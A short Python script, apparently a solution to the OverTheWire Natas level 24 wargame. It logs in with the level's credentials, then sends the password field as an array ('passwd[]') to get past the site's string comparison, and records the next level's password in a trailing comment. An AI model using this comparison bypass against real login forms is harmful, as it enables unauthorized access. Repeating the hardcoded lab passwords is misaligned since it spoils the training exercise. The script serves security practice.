import requests
from string import *

username='natas24'
password='OsRmXFguozKpTZZ5X14zNO43379LZveg'
url='http://natas24.natas.labs.overthewire.org/'
session=requests.Session()

response=session.post(url,data={"passwd[]" : "balda"},auth=(username,password))
print response.text
print "="*80


#GHF6X7YwACaYYssHVY05cFq83hRktl4c
